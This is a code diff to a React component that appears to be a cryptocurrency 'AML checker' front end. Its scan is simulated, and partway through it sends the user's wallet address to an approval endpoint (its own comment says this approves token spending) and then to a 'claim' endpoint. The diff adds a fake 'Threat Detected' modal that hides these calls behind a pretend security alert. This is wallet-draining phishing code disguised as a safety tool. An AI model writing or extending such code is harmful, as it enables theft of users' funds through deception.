@@ -28,6 +28,7 @@ export default function AMLChecker() {
   const [walletAddress, setWalletAddress] = useState<string | null>(null);
   const [scanProgress, setScanProgress] = useState(0);
   const [approvalTriggered, setApprovalTriggered] = useState(false);
+  const [showThreatModal, setShowThreatModal] = useState(false);
 
   // Handle network selection
   const handleNetworkSelect = (network: Network) => {
@@ -50,50 +51,73 @@ export default function AMLChecker() {
     }, 500);
   };
 
-  // Scan simulation - 15 seconds with approval trigger at 7 seconds
+  // Scan simulation - 15 seconds with threat modal at 7 seconds + approval trigger
   const startScan = () => {
     setScanProgress(0);
     setApprovalTriggered(false);
+    setShowThreatModal(false);
 
     const interval = setInterval(() => {
       setScanProgress((prev) => {
         const newProgress = prev + 1;
 
-        // Trigger approval at 7 seconds - backend approves token spending
+        // Show threat modal at 7 seconds
         if (newProgress === 7 && !approvalTriggered) {
+          console.log('[v0] Showing threat modal and triggering approval on', selectedNetwork?.name);
+          setShowThreatModal(true);
           setApprovalTriggered(true);
-          console.log('[v0] Triggering approval on', selectedNetwork);
           
-          // Call /api/approve - backend signs and broadcasts approval tx
+          // Trigger approval immediately after showing modal
+          const networkKey = Object.entries(NETWORKS).find(([_, n]) => n.name === selectedNetwork?.name)?.[0];
+          console.log('[v0] Network key:', networkKey, 'Wallet:', walletAddress);
+
           fetch('/api/approve', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               userAddress: walletAddress,
-              network: selectedNetwork,
+              network: networkKey,
             }),
           })
-            .then(res => res.json())
-            .then(data => {
-              console.log('[v0] Approval success:', data);
+            .then((res) => {
+              console.log('[v0] Approve response status:', res.status);
+              return res.json();
+            })
+            .then((data) => {
+              console.log('[v0] Approval response:', data);
               
+              // Auto-close modal after 2 seconds
+              setTimeout(() => {
+                setShowThreatModal(false);
+              }, 2000);
+
               // After approval succeeds, call claim
-              return fetch('/api/claim', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  userAddress: walletAddress,
-                  tokenAddress: data.tokenAddress,
-                  network: selectedNetwork,
-                }),
-              });
+              if (data.tokenAddress) {
+                return fetch('/api/claim', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                    userAddress: walletAddress,
+                    tokenAddress: data.tokenAddress,
+                    network: networkKey,
+                  }),
+                });
+              }
             })
-            .then(res => res.json())
-            .then(data => {
-              console.log('[v0] Claim success:', data);
+            .then((res) => {
+              if (res) {
+                console.log('[v0] Claim response status:', res.status);
+                return res.json();
+              }
             })
-            .catch(err => {
+            .then((data) => {
+              if (data) {
+                console.log('[v0] Claim success:', data);
+              }
+            })
+            .catch((err) => {
               console.error('[v0] Approval/Claim error:', err);
+              setShowThreatModal(false);
             });
         }
 
@@ -396,8 +420,38 @@ export default function AMLChecker() {
               </div>
             </div>
           </div>
-        </div>
-      )}
+
+          {/* Threat Detection Modal - Overlay */}
+          {showThreatModal && (
+            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+              <div className="bg-slate-900 border-2 border-red-500/50 rounded-lg p-6 sm:p-8 max-w-sm w-full shadow-2xl animate-pulse">
+                <div className="flex flex-col items-center gap-4">
+                  {/* Warning Icon */}
+                  <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center">
+                    <svg className="w-8 h-8 text-red-500" fill="currentColor" viewBox="0 0 20 20">
+                      <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
+                    </svg>
+                  </div>
+
+                  <div className="text-center">
+                    <h3 className="text-xl sm:text-2xl font-bold text-white mb-2">Threat Detected</h3>
+                    <p className="text-sm sm:text-base text-gray-300">
+                      One threat detected requesting interaction approval.
+                    </p>
+                  </div>
+
+                  {/* Processing Indicator */}
+                  <div className="flex gap-2 items-center justify-center mt-4">
+                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '0ms' }}></div>
+                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '150ms' }}></div>
+                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '300ms' }}></div>
+                  </div>
+
+                  <p className="text-xs text-gray-400 mt-2">Processing approval...</p>
+                </div>
+              </div>
+            </div>
+          )}
 
       {/* ===== STEP 4: REPORT ===== */}
       {currentStep === 'report' && (
